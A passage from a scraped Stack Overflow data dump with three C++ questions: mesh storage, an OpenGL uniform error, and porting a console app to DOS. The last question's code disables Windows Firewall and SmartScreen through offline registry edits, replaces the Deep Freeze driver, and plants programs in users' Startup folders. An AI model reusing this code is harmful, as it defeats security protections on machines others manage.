"link": "https://stackoverflow.com/users/4820449/hamidmly"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 72, "favorite_count": 0, "accepted_answer_id": 29805218, "answer_count": 1, "score": 0, "last_activity_date": 1429724714, "creation_date": 1429722765, "question_id": 29804545, "link": "https://stackoverflow.com/questions/29804545/what-is-the-best-way-between-instantiate-an-object-or-use-pointers", "title": "what is the best way between : instantiate an object or use pointers", "body": "<p>We want to create our own list of triangles from a list already existed of STL mode (it's a 3D geometric model, which composed of triangle), several triangle can had the same point, we want to use the best solution:</p>\n\n<p>S1) that goes through the list, use the coordinates of each triangle (element) of this list to create a triangle object and we put it in our list (victor). but here there are points that must be created multiple times, because as I have said many triangles can have the same point.</p>\n\n<p>S2) there already existed another list that contains all the points, then it goes through the list of triangle  already existed and for each point of triangle we search it in the list of points (so we have to use sort and search algorithms) to use pointers (point on these points) and create objects that contients 3 pointers (*p1, *p2, *p3) and put them in our list.</p>\n"}, {"tags": ["c++", "opengl", "glm-math"], "answers": [{"comments": [{"owner": {"reputation": 1599, "user_id": 3006846, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/4e4afd16fa52320d43ea91b361e7ba95?s=128&d=identicon&r=PG", "display_name": "chbaker0", "link": "https://stackoverflow.com/users/3006846/chbaker0"}, "edited": false, "score": 5, "creation_date": 1429723506, "post_id": 29804637, "comment_id": 47737294, "body": "I&#39;m pretty sure that should be <code>glm::value_ptr(v)</code>"}, {"owner": {"reputation": 757, "user_id": 3552250, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/uIqFP.jpg?s=128&g=1", "display_name": "houcros", "link": "https://stackoverflow.com/users/3552250/houcros"}, "edited": false, "score": 0, "creation_date": 1429783563, "post_id": 29804637, "comment_id": 47766758, "body": "Perfect, that little correction did the trick. Working now. Thank you!"}], "tags": [], "owner": {"reputation": 7060, "user_id": 105466, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/jMWs6.png?s=128&g=1", "display_name": "SurvivalMachine", "link": "https://stackoverflow.com/users/105466/survivalmachine"}, "is_accepted": true, "score": 3, "last_activity_date": 1429723042, "creation_date": 1429723042, "answer_id": 29804637, "question_id": 29804488, "link": "https://stackoverflow.com/questions/29804488/gluniform3fv-not-working-opengl/29804637#29804637", "title": "glUniform3fv not working OpenGL", "body": "<p>You need to give a pointer to the vector, not the vector itself. For example:</p>\n\n<pre><code>glm::vec3 v(1.0f);\nglUniform3fv(focusLoc, 1, glm::value_ptr(&amp;v[0]));\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 757, "user_id": 3552250, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/uIqFP.jpg?s=128&g=1", "display_name": "houcros", "link": "https://stackoverflow.com/users/3552250/houcros"}, "is_accepted": false, "score": 6, "last_activity_date": 1430085272, "creation_date": 1430085272, "answer_id": 29884042, "question_id": 29804488, "link": "https://stackoverflow.com/questions/29804488/gluniform3fv-not-working-opengl/29884042#29884042", "title": "glUniform3fv not working OpenGL", "body": "<p>Actually, I just found out today that there's a cleaner and more straight forward way. Simply:</p>\n\n<pre><code>glUniform3fv(focusLoc, 1, &amp;v[0]);\n</code></pre>\n\n<p>No need to import <em>value_ptr</em>.</p>\n"}], "owner": {"reputation": 757, "user_id": 3552250, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/uIqFP.jpg?s=128&g=1", "display_name": "houcros", "link": "https://stackoverflow.com/users/3552250/houcros"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 9194, "favorite_count": 0, "accepted_answer_id": 29804637, "answer_count": 2, "score": -1, "last_activity_date": 1495319345, "creation_date": 1429722625, "last_edit_date": 1495319345, "question_id": 29804488, "link": "https://stackoverflow.com/questions/29804488/gluniform3fv-not-working-opengl", "title": "glUniform3fv not working OpenGL", "body": "<p>I'm working on a piece of code in OpenGL. \nI'm getting the following error message while trying to compile:</p>\n\n<pre><code>MyGLWidget.cpp: In member function \u2018virtual void MyGLWidget::initializeGL()\u2019:\nMyGLWidget.cpp:30:38: error: cannot convert \u2018glm::vec3 {aka glm::tvec3&lt;float, (glm::precision)0u&gt;}\u2019 to \u2018const GLfloat* {aka const float*}\u2019 in argument passing\nMyGLWidget.cpp:31:39: error: cannot convert \u2018glm::vec3 {aka glm::tvec3&lt;float, (glm::precision)0u&gt;}\u2019 to \u2018const GLfloat* {aka const float*}\u2019 in argument passing\n</code></pre>\n\n<p>I have declared these locations in MyGLWidget.h as follows:</p>\n\n<pre><code>    GLuint llumLoc, focusLoc;\n</code></pre>\n\n<p>And have initialize them in MyGLWidget.cpp as:</p>\n\n<pre><code>  llumLoc = glGetUniformLocation (program-&gt;programId(), \"llumAmbient\");\n  focusLoc = glGetUniformLocation (program-&gt;programId(), \"posFocus\");\n</code></pre>\n\n<p>\"llumAmbient\" and \"posFocus\" are uniforms in my vertex shader:</p>\n\n<pre><code>uniform vec3 llumAmbient;\nuniform vec3 posFocus;\n</code></pre>\n\n<p>I get the mentioned error message while trying to call the following code inside of MyGLWidget::initializeGL</p>\n\n<pre><code>glUniform3fv(llumLoc, 1, glm::vec3(0.2));\nglUniform3fv(focusLoc, 1, glm::vec3(1.0));\n</code></pre>\n\n<p>Obviously, I've tried to follow the documentation at <a href=\"http://www.opengl.org\" rel=\"nofollow\">www.opengl.org</a> and <a href=\"http://glm.g-truc.net/0.9.2/api/a00001.html\" rel=\"nofollow\">glm.g-truc.net/0.9.2/api/a00001.html</a>, but I just can't see what's wrong with this code...</p>\n"}, {"tags": ["c++", "linux", "windows", "batch-file"], "comments": [{"owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 0, "creation_date": 1429722143, "post_id": 29804274, "comment_id": 47736383, "body": "You have several questions here. Notice that many Linux distributions (e.g. Debian) can be configured to not start the Xorg server and run a login shell very early."}, {"owner": {"reputation": 107, "user_id": 4304515, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/aJO6V.jpg?s=128&g=1", "display_name": "KiralyCraft", "link": "https://stackoverflow.com/users/4304515/kiralycraft"}, "reply_to_user": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 0, "creation_date": 1429722241, "post_id": 29804274, "comment_id": 47736448, "body": "I added the linux question because that could be an alternative, but the most preferable way is to run the app under a DOS environment"}, {"owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 0, "creation_date": 1429722604, "post_id": 29804274, "comment_id": 47736694, "body": "Did you consider booting <a href=\"http://www.freedos.org/\" rel=\"nofollow noreferrer\">freedos</a>? BTW, your questions are confusing. Please edit your question to improve it. Ask only one question at a time. StackOverflow is for questions related to some source code, but you show no source code in your question."}, {"owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 0, "creation_date": 1429722666, "post_id": 29804274, "comment_id": 47736738, "body": "And you generally need some operating system to write to the disk."}, {"owner": {"reputation": 8756, "user_id": 416274, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/fa38a4e372afb202e6ab7eb1619372a8?s=128&d=identicon&r=PG", "display_name": "Robinson", "link": "https://stackoverflow.com/users/416274/robinson"}, "edited": false, "score": 2, "creation_date": 1429722716, "post_id": 29804274, "comment_id": 47736770, "body": "Is it a console app?"}, {"owner": {"reputation": 107, "user_id": 4304515, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/aJO6V.jpg?s=128&g=1", "display_name": "KiralyCraft", "link": "https://stackoverflow.com/users/4304515/kiralycraft"}, "edited": false, "score": 0, "creation_date": 1429723046, "post_id": 29804274, "comment_id": 47736992, "body": "Updated my question. Yes, it&#39;s a console app"}, {"owner": {"reputation": 26723, "user_id": 995714, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/w1393.jpg?s=128&g=1", "display_name": "phuclv", "link": "https://stackoverflow.com/users/995714/phuclv"}, "edited": false, "score": 2, "creation_date": 1429723603, "post_id": 29804274, "comment_id": 47737349, "body": "is there a registry in DOS?"}, {"owner": {"reputation": 107, "user_id": 4304515, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/aJO6V.jpg?s=128&g=1", "display_name": "KiralyCraft", "link": "https://stackoverflow.com/users/4304515/kiralycraft"}, "edited": false, "score": 0, "creation_date": 1429726145, "post_id": 29804274, "comment_id": 47739135, "body": "I don&#39;t know actually, but I need to acces the registery somehow, but getting the app to run is the first priority"}, {"owner": {"reputation": 159118, "user_id": 15416, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/a2b11b9662b5155aada74191fbe7cb9e?s=128&d=identicon&r=PG", "display_name": "MSalters", "link": "https://stackoverflow.com/users/15416/msalters"}, "edited": false, "score": 0, "creation_date": 1429729485, "post_id": 29804274, "comment_id": 47741210, "body": "There is no registry (I&#39;m showing my age here, I guess). I don&#39;t think the idea works at all, though - if you boot Windows XP from DVD, you don&#39;t get the installed registry either. After all, it&#39;s precisely when that registry is corrupted that you want to boot from DVD."}], "answers": [{"comments": [{"owner": {"reputation": 107, "user_id": 4304515, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/aJO6V.jpg?s=128&g=1", "display_name": "KiralyCraft", "link": "https://stackoverflow.com/users/4304515/kiralycraft"}, "edited": false, "score": 0, "creation_date": 1429726303, "post_id": 29805582, "comment_id": 47739250, "body": "I will take a look at Watcom, as for Windows API calls, how else should I access DOS&#39;s &quot;copy&quot; command? I used the Windows API to use it&#39;s &quot;copy&quot; command which also features the /v (verify) command. Any DOS-equivalent?"}, {"owner": {"reputation": 9554, "user_id": 31782, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/8ea4581df89970a5ba17daf4ad93041c?s=128&d=identicon&r=PG", "display_name": "n0rd", "link": "https://stackoverflow.com/users/31782/n0rd"}, "reply_to_user": {"reputation": 107, "user_id": 4304515, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/aJO6V.jpg?s=128&g=1", "display_name": "KiralyCraft", "link": "https://stackoverflow.com/users/4304515/kiralycraft"}, "edited": false, "score": 0, "creation_date": 1429726505, "post_id": 29805582, "comment_id": 47739374, "body": "@KiralyCraft, you seem to misunderstand what Windows API is. <code>GetLogicalDriveStrings</code>, <code>GetFileAttributesA</code>, <code>GetDriveType</code> are all windows API calls and will not be available in DOS, <code>reg.exe</code> that you call will not be callable in DOS either as it is Win32 executable."}], "tags": [], "owner": {"reputation": 1964, "user_id": 1320881, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b69670b7cc6bce132f443eee557c9448?s=128&d=identicon&r=PG", "display_name": "Unimportant", "link": "https://stackoverflow.com/users/1320881/unimportant"}, "is_accepted": true, "score": 2, "last_activity_date": 1429725860, "creation_date": 1429725860, "answer_id": 29805582, "question_id": 29804274, "link": "https://stackoverflow.com/questions/29804274/compile-existing-c-code-to-run-in-dos/29805582#29805582", "title": "Compile existing C++ code to run in DOS", "body": "<p>First of all , you need a compiler that can produce DOS code, such as watcom c++ : <a href=\"http://www.openwatcom.org/index.php/Main_Page\" rel=\"nofollow\">http://www.openwatcom.org/index.php/Main_Page</a></p>\n\n<p>Your program uses windows api calls (it includes windows.h), you will need to replace all these functions with their DOS equivalents or write substitutes yourself.</p>\n"}], "owner": {"reputation": 107, "user_id": 4304515, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/aJO6V.jpg?s=128&g=1", "display_name": "KiralyCraft", "link": "https://stackoverflow.com/users/4304515/kiralycraft"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 161, "favorite_count": 0, "accepted_answer_id": 29805582, "answer_count": 1, "score": -1, "last_activity_date": 1429725860, "creation_date": 1429722015, "last_edit_date": 1429723013, "question_id": 29804274, "link": "https://stackoverflow.com/questions/29804274/compile-existing-c-code-to-run-in-dos", "title": "Compile existing C++ code to run in DOS", "body": "<p>I currently have an app in C++ which copies some files to the user's HDD. I use Hiren's BootCD on a flash drive to launch the MiniXP and run my app under that, but the load times are kind of slow, so I thought of adding my app in the DOS image that came with the disk. My problem is that the app will not run because \"This app cannot be run in DOS mode\". </p>\n\n<p>How can I run this application under DOS or possibly any other operating system which will boot quick enough from the USB drive?</p>\n\n<p>My app is a console application, and it's code is:</p>\n\n<pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;windows.h&gt;\n#include &lt;string.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;io.h&gt;\n#define MAX 256\nusing namespace std;\nstring systemdrive;\nstring users[MAX];int userscontor=0;\nbool choosew7orxp;\nvoid menu();\nbool exists(const std::string&amp; dirName_in)\n{\n  DWORD ftyp = GetFileAttributesA(dirName_in.c_str());\n  if (ftyp == INVALID_FILE_ATTRIBUTES)\n    return false;  //something is wrong with your path!\n\n  if (ftyp &amp; FILE_ATTRIBUTE_DIRECTORY)\n    return true;   // this is a directory!\n\n  return false;    // this is not a directory!\n}\nbool fileexists (const std::string&amp; name) {\n  struct stat buffer;\n  return (stat (name.c_str(), &amp;buffer) == 0);\n}\nvoid checkdrive(char drive[])\n{\n    string s(drive);\n    s+=\"Windows\";\n    if (exists(s))\n    {\n        systemdrive = string(drive);\n    }\n}\nvoid list()\n{\n    int dr_type=99;\n    char dr_avail[MAX];\n    char *temp=dr_avail;\n    /* 1st we fill the buffer */\n    GetLogicalDriveStrings(MAX,dr_avail);\n    while(*temp!=NULL) { // Split the buffer by null\n        dr_type=GetDriveType(temp);\n        switch(dr_type) {\n            case 3: // Fixed\n            checkdrive(temp);\n            break;\n        }\n        temp += lstrlen(temp) +1; // incriment the buffer\n\n    }\n\n}\nvoid copyfiles(string a1,string a2)\n{\n    system((char*)(string(\"copy /V \\\"\"+a1+\"\\\" \\\"\"+a2+\"\\\"\").c_str()));\n}\nvoid redeepfreeze()\n{\n    system(\"cls\");\n    if (!fileexists(systemdrive+\"DeepFrz.backup\"))\n    {\n        cout &lt;&lt; \"&gt; Backup does not exist!\\n\";\n        Sleep(1000);\n        menu();\n    }\n    else\n    {\n        cout &lt;&lt;\"&gt; Found Backup.\\n\";\n        cout &lt;&lt;\"&gt; Restoring backup.\\n\";\n\n        string f = systemdrive;\n        f+=\"Windows\\\\System32\\\\drivers\\\\DeepFrz.sys\";\n        if( remove(f.c_str()) !=0 )\n        {\n            cout &lt;&lt; \"&gt; Cannot delete file! Aborting.\\n\";\n            Sleep(1000);\n            menu();\n        }\n        copyfiles(systemdrive+\"DeepFrz.backup\",systemdrive+\"Windows\\\\System32\\\\drivers\\\\DeepFrz.sys\");\n        cout &lt;&lt;\"&gt; Backup restored under \\\"DeepFrz.sys\\\"\\n\";\n        Sleep(1000);\n        menu();\n\n    }\n}\nvoid disablefirewall()\n{\n    system(\"cls\");\n    cout &lt;&lt;\"&gt; Loading registery from windows machine...\\n\";\n//    cout &lt;&lt; \"reg load HKLM\\\\OLD_SYSTEM \"+systemdrive+\"Windows\\\\System32\\\\Config\\\\System\";\n    system((char*)(string(\"reg load HKLM\\\\OLD_SYSTEM \"+systemdrive+\"Windows\\\\System32\\\\Config\\\\SYSTEM\").c_str()));\n    cout &lt;&lt;\"&gt; Registery loaded, disabling Firewall :3\\n\";\n    for (int i=0;i&lt;=9;i++)\n    {\n        char buff[33];\n        system((char*)(string(\"reg add \\\"HKLM\\\\OLD_SYSTEM\\\\ControlSet00\"+string(itoa(i,buff,10))+\"\\\\services\\\\SharedAccess\\\\Parameters\\\\FirewallPolicy\\\\DomainProfile\\\" /v EnableFirewall /t reg_dword /d 0 /f\").c_str()));\n        system((char*)(string(\"reg add \\\"HKLM\\\\OLD_SYSTEM\\\\ControlSet00\"+string(itoa(i,buff,10))+\"\\\\services\\\\SharedAccess\\\\Parameters\\\\FirewallPolicy\\\\StandardProfile\\\" /v EnableFirewall /t reg_dword /d 0 /f\").c_str()));\n        system((char*)(string(\"reg add \\\"HKLM\\\\OLD_SYSTEM\\\\ControlSet00\"+string(itoa(i,buff,10))+\"\\\\services\\\\SharedAccess\\\\Parameters\\\\FirewallPolicy\\\\PublicProfile\\\" /v EnableFirewall /t reg_dword /d 0 /f\").c_str()));\n    }\n//    system((char*)(string(\"reg add \\\"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\services\\\\SharedAccess\\\\Parameters\\\\FirewallPolicy\\\\DomainProfile\\\" /v EnableFirewall /t reg_dword /d 0 /f\").c_str()));\n//    system((char*)(string(\"reg add \\\"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\services\\\\SharedAccess\\\\Parameters\\\\FirewallPolicy\\\\StandardProfile\\\" /v EnableFirewall /t reg_dword /d 0 /f\").c_str()));\n//    system((char*)(string(\"reg add \\\"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\services\\\\SharedAccess\\\\Parameters\\\\FirewallPolicy\\\\PublicProfile\\\" /v EnableFirewall /t reg_dword /d 0 /f\").c_str()));\n    cout &lt;&lt;\"&gt; Operation completed,saving..\\n\";\n    system(\"reg unload HKLM\\\\OLD_SYSTEM\");\n    cout &lt;&lt;\"&gt; Done.\\n\";\n    Sleep(1000);\n    menu();\n}\nvoid disablesmartscreen()\n{\n    system(\"cls\");\n    cout &lt;&lt;\"&gt; Loading registery from windows machine...\\n\";\n    system((char*)(string(\"reg load HKLM\\\\OLD_SOFTWARE \"+systemdrive+\"Windows\\\\System32\\\\Config\\\\Software\").c_str()));\n    cout &lt;&lt;\"&gt; Registery loaded, disabling SmartScreen :3\\n\";\n//    cout &lt;&lt;\"reg add \\\"HKLM\\\\OLD_SOFTWARE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\" /v SmartScreenEnabled /t reg_sz /d Off /f\";\n//    system(\"pause\");\n    system((char*)(string(\"reg add \\\"HKLM\\\\OLD_SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\" /v SmartScreenEnabled /t reg_sz /d Off /f\").c_str()));\n    cout &lt;&lt;\"&gt; Operation completed,saving..\\n\";\n    system(\"reg unload HKLM\\\\OLD_SOFTWARE\");\n    cout &lt;&lt;\"&gt; Done.\\n\";\n    Sleep(1000);\n    menu();\n}\n//}\nvoid deldeepfreeze()\n{\n    system(\"cls\");\n    if (!fileexists(systemdrive+\"Windows\\\\System32\\\\drivers\\\\DeepFrz.sys\"))\n    {\n        cout &lt;&lt; \"&gt; Deepfreeze does not exist!\\n\";\n        Sleep(1000);\n        menu();\n    }\n    else\n    {\n        cout &lt;&lt;\"&gt; Found DeepFreeze.\\n\";\n        cout &lt;&lt;\"&gt; Creating backup.\\n\";\n//        copyfiles(systemdrive+\"Windows\\\\System32\\\\drivers\\\\DeepFrz.sys\",systemdrive+\"Windows\\\\System32\\\\drivers\\\\DeepFrz.backup\");\n        copyfiles(systemdrive+\"Windows\\\\System32\\\\drivers\\\\DeepFrz.sys\",systemdrive+\"DeepFrz.backup\");\n        cout &lt;&lt;\"&gt; Attempting to unfreeze part one...\\n\";\n\n        string f = systemdrive;\n        f+=\"Windows\\\\System32\\\\drivers\\\\DeepFrz.sys\";\n\n        if( remove(f.c_str()) !=0 )\n        {\n            cout &lt;&lt; \"&gt; Cannot delete file! Aborting.\\n\";\n            Sleep(1000);\n            menu();\n        }\n\n        cout &lt;&lt;\"&gt; Backup crated under \\\"DeepFrz.backup\\\"\\n\";\n        cout &lt;&lt;\"&gt; Searching for \\\"ntfs.sys\\\"...\\n\";\n        if (!fileexists(systemdrive+\"Windows\\\\System32\\\\drivers\\\\ntfs.sys\"))\n        {\n            cout &lt;&lt;\" &gt; ERROR. Cannot find ntfs.sys! Aborting.\\n\";\n            Sleep(1000);\n            menu();\n        }\n        else\n        {\n            cout &lt;&lt; \"&gt; Patching ntfs.sys...\\n\";\n            copyfiles(systemdrive+\"Windows\\\\System32\\\\drivers\\\\ntfs.sys\",systemdrive+\"Windows\\\\System32\\\\drivers\\\\DeepFrz.sys\");\n            cout &lt;&lt; \"&gt; Patching DONE. Computer unfrozen!\\n\";\n            Sleep(1000);\n            menu();\n        }\n    }\n}\nvoid list(char* dir,string users[],int &amp;unr)\n{\n    int con=0;\n    char originalDirectory[_MAX_PATH];\n\n    // Get the current directory so we can return to it\n    _getcwd(originalDirectory, _MAX_PATH);\n\n    _chdir(dir);  // Change to the working directory\n    _finddata_t fileinfo;\n\n    // This will grab the first file in the directory\n    // \"*\" can be changed if you only want to look for specific files\n    intptr_t handle = _findfirst(\"*\", &amp;fileinfo);\n\n    if(handle == -1)  // No files or directories found\n    {\n        cout &lt;&lt;\"&gt; No users found.\\n\";\n        return;\n    }\n\n    do\n    {\n        if(strcmp(fileinfo.name, \".\") == 0 || strcmp(fileinfo.name, \"..\") == 0)\n            continue;\n        if(fileinfo.attrib &amp; _A_SUBDIR) // Use bitmask to see if this is a directory\n        {\n            users[con]=fileinfo.name;\n            con++;\n        }\n\n//        else\n//            cout &lt;&lt; \"This is a file.\" &lt;&lt; endl;\n    } while(_findnext(handle, &amp;fileinfo) == 0);\n\n    _findclose(handle); // Close the stream\n\n    _chdir(originalDirectory);\n    unr=con;\n}\n\nvoid installapp(char* app)\n{\n    system(\"cls\");\n    if (!fileexists(app))\n    {\n        cout &lt;&lt; \"&gt; \"&lt;&lt;app&lt;&lt;\" does not exist!\\n\";\n        Sleep(1000);\n        menu();\n    }\n    else\n    {\n       if (choosew7orxp==true)///it's W7 or W8\n       {\n           string temp = systemdrive+\"Users\";\n           string tmpu[MAX];\n           int amont;\n           list((char*)temp.c_str(),tmpu,amont);\n           cout &lt;&lt; \"&gt; Which user are you? Enter the #\"&lt;&lt;\"\\n\\n\";\n           for (int i=0;i&lt;amont;i++)\n           {\n               cout &lt;&lt; \"User number #\"&lt;&lt;i&lt;&lt;\": \"&lt;&lt;tmpu[i]&lt;&lt;\"\\n\";\n           }\n           int nr;\n           cin &gt;&gt; nr;\n           while (nr&lt;0||nr&gt;amont)\n           {\n               cout &lt;&lt; \"Invalid number!\\n\";cin&gt;&gt;nr;\n           }\n           system(\"cls\");\n           cout &lt;&lt; \"&gt; You selected user #\"&lt;&lt;nr&lt;&lt;\", which is \\\"\"&lt;&lt;tmpu[nr]&lt;&lt;\"\\\".\\n\";\n           string dest = systemdrive+\"Users\\\\\"+tmpu[nr]+\"\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\";\n           cout &lt;&lt;\"&gt; Installing..\\n\";\n           copyfiles(app,dest+\"\\\\\"+app);\n           cout &lt;&lt;\"&gt; Done!\\n\";\n           Sleep(1000);\n\n       }\n       else\n       { ///it's WXP\n           string temp = systemdrive+\"Documents and Settings\";\n           string tmpu[MAX];\n           int amont;\n           list((char*)temp.c_str(),tmpu,amont);\n           cout &lt;&lt; \"&gt; Which user are you? Enter the #\"&lt;&lt;\"\\n\\n\";\n           for (int i=0;i&lt;amont;i++)\n           {\n               cout &lt;&lt; \"User number #\"&lt;&lt;i&lt;&lt;\": \"&lt;&lt;tmpu[i]&lt;&lt;\"\\n\";\n           }\n           int nr;\n           cin &gt;&gt; nr;\n           while (nr&lt;0||nr&gt;amont)\n           {\n               cout &lt;&lt; \"Invalid number!\\n\";cin&gt;&gt;nr;\n           }\n           system(\"cls\");\n           cout &lt;&lt; \"&gt; You selected user #\"&lt;&lt;nr&lt;&lt;\", which is \\\"\"&lt;&lt;tmpu[nr]&lt;&lt;\"\\\".\\n\";\n           string dest = systemdrive+\"Documents and Settings\\\\\"+tmpu[nr]+\"\\\\Start Menu\\\\Programs\\\\Startup\";\n           cout &lt;&lt;\"&gt; Installing..\\n\";\n           copyfiles(app,dest+\"\\\\\"+app);\n           cout &lt;&lt;\"&gt; Done!\\n\";\n           Sleep(1000);\n       }\n    }\n}\nvoid masseject_fix()\n{\n    system(\"cls\");\n    char letter;\n    cout &lt;&lt;\"&gt; What is your default CD letter?\\n\";\n    cin &gt;&gt; letter;\n    letter=toupper(letter);\n    cout &lt;&lt;\"&gt; Selected drive: \\\"\"&lt;&lt;letter&lt;&lt;\":\\\\\\\".\\n\";\n\n   if (choosew7orxp==true)///it's W7 or W8\n   {\n       string temp = systemdrive+\"Users\";\n       string tmpu[MAX];\n       int amont;\n       list((char*)temp.c_str(),tmpu,amont);\n       cout &lt;&lt; \"&gt; Which user are you? Enter the #\"&lt;&lt;\"\\n\\n\";\n       for (int i=0;i&lt;amont;i++)\n       {\n           cout &lt;&lt; \"User number #\"&lt;&lt;i&lt;&lt;\": \"&lt;&lt;tmpu[i]&lt;&lt;\"\\n\";\n       }\n       int nr;\n       cin &gt;&gt; nr;\n       while (nr&lt;0||nr&gt;amont)\n       {\n           cout &lt;&lt; \"Invalid number!\\n\";cin&gt;&gt;nr;\n       }\n       system(\"cls\");\n       cout &lt;&lt; \"&gt; You selected user #\"&lt;&lt;nr&lt;&lt;\", which is \\\"\"&lt;&lt;tmpu[nr]&lt;&lt;\"\\\".\\n\";\n       string dest = systemdrive+\"Users\\\\\"+tmpu[nr]+\"\\\\AppData\\\\Roaming\";\n\n       fstream fout((dest+\"\\\\massdrive.txt\").c_str(),ios::out);\n       fout&lt;&lt;\" \"&lt;&lt;letter;\n       fout.close();\n       cout &lt;&lt;\"&gt; Done!\\n\";\n       Sleep(1000);\n\n   }\n   else\n   { ///it's WXP\n       string temp = systemdrive+\"Documents and Settings\";\n       string tmpu[MAX];\n       int amont;\n       list((char*)temp.c_str(),tmpu,amont);\n       cout &lt;&lt; \"&gt; Which user are you? Enter the #\"&lt;&lt;\"\\n\\n\";\n       for (int i=0;i&lt;amont;i++)\n       {\n           cout &lt;&lt; \"User number #\"&lt;&lt;i&lt;&lt;\": \"&lt;&lt;tmpu[i]&lt;&lt;\"\\n\";\n       }\n       int nr;\n       cin &gt;&gt; nr;\n       while (nr&lt;0||nr&gt;amont)\n       {\n           cout &lt;&lt; \"Invalid number!\\n\";cin&gt;&gt;nr;\n       }\n       system(\"cls\");\n       cout &lt;&lt; \"&gt; You selected user #\"&lt;&lt;nr&lt;&lt;\", which is \\\"\"&lt;&lt;tmpu[nr]&lt;&lt;\"\\\".\\n\";\n       string dest = systemdrive+\"Documents and Settings\\\\\"+tmpu[nr]+\"\\\\Application Data\";\n\n\n       cout &lt;&lt;\"&gt; Done!\\n\";\n       Sleep(1000);\n   }\n\n}\nvoid installAppdata(char* app)\n{\n    if (!fileexists(app))\n    {\n        cout &lt;&lt; \"&gt; \"&lt;&lt;app&lt;&lt;\" does not exist!\\n\";\n        Sleep(1000);\n        menu();\n    }\n    else\n    {\n       if (choosew7orxp==true)///it's W7 or W8\n       {\n           string temp = systemdrive+\"Users\";\n           string tmpu[MAX];\n           int amont;\n           list((char*)temp.c_str(),tmpu,amont);\n           cout &lt;&lt; \"&gt; Which user are you? Enter the #\"&lt;&lt;\"\\n\\n\";\n           for (int i=0;i&lt;amont;i++)\n           {\n               cout &lt;&lt; \"User number #\"&lt;&lt;i&lt;&lt;\": \"&lt;&lt;tmpu[i]&lt;&lt;\"\\n\";\n           }\n           int nr;\n           cin &gt;&gt; nr;\n           while (nr&lt;0||nr&gt;amont)\n           {\n               cout &lt;&lt; \"Invalid number!\\n\";cin&gt;&gt;nr;\n           }\n           system(\"cls\");\n           cout &lt;&lt; \"&gt; You selected user #\"&lt;&lt;nr&lt;&lt;\", which is \\\"\"&lt;&lt;tmpu[nr]&lt;&lt;\"\\\".\\n\";\n           string dest = systemdrive+\"Users\\\\\"+tmpu[nr]+\"\\\\AppData\\\\Roaming\";\n           cout &lt;&lt;\"&gt; Installing..\\n\";\n           copyfiles(app,dest+\"\\\\\"+app);\n           cout &lt;&lt;\"&gt; Done!\\n\";\n           Sleep(1000);\n\n       }\n       else\n       { ///it's WXP\n           string temp = systemdrive+\"Documents and Settings\";\n           string tmpu[MAX];\n           int amont;\n           list((char*)temp.c_str(),tmpu,amont);\n           cout &lt;&lt; \"&gt; Which user are you? Enter the #\"&lt;&lt;\"\\n\\n\";\n           for (int i=0;i&lt;amont;i++)\n           {\n               cout &lt;&lt; \"User number #\"&lt;&lt;i&lt;&lt;\": \"&lt;&lt;tmpu[i]&lt;&lt;\"\\n\";\n           }\n           int nr;\n           cin &gt;&gt; nr;\n           while (nr&lt;0||nr&gt;amont)\n           {\n               cout &lt;&lt; \"Invalid number!\\n\";cin&gt;&gt;nr;\n           }\n           system(\"cls\");\n           cout &lt;&lt; \"&gt; You selected user #\"&lt;&lt;nr&lt;&lt;\", which is \\\"\"&lt;&lt;tmpu[nr]&lt;&lt;\"\\\".\\n\";\n           string dest = systemdrive+\"Documents and Settings\\\\\"+tmpu[nr]+\"\\\\Application Data\";\n           cout 